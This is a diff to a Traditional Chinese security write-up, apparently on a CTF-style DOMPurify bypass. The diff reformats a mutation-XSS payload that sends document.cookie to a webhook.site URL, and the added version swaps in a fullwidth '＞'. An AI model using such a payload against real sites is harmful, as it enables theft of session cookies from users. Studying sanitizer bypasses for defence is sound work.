@@ -792,7 +792,10 @@ Page /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js n
 舉例來說，作者給的 payload：
 
 ``` html
-<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
+<div>
+  <div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div>
+  <style>
+    <![CDATA[</style><div data-x="]]＞</style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
 ```
 
 會被 HTML parser 解析為 style tag + 一個含有 `data-x` 屬性的 div，所以 DOMPurify 不會做任何事情，這是沒問題的 HTML。
